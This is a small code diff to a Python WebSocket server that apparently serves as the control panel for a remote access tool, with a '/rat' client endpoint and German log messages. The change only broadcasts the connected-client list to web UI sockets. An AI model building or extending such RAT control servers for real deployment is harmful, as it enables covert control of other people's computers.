@@ -246,10 +246,14 @@ async def send_client_list():
             }
             for cid, ws in RAT_CLIENTS.items()
         ]
-        await send_to_web_ui({"type": "client_list", "clients": clients})
+        for ws in list(WEB_UI_SOCKETS):
+            try:
+                await ws.send_json({"type": "client_list", "clients": clients})
+            except Exception:
+                WEB_UI_SOCKETS.discard(ws)
     except Exception as e:
         logging.error(f"Fehler beim Senden der Client-Liste: {e}")
-
+        
 # --- RAT-Client WebSocket Endpunkt ---
 @app.websocket("/rat")
 async def rat_client_endpoint(websocket: WebSocket):
